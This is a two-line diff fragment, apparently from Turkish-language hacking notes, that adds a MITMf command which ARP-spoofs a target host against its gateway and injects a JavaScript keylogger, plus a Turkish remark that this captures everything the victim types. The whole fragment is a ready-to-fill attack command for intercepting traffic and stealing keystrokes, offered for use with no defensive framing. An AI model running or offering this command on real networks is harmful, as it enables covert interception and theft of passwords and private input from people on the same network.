@@ -1,0 +1,2 @@
+mitmf --arp --spoof --gateway <gateway_ip> --target <target_ip> -i <interface> --jskeylogger
+Bu sayede yazılan her şeyi alabiliriz.
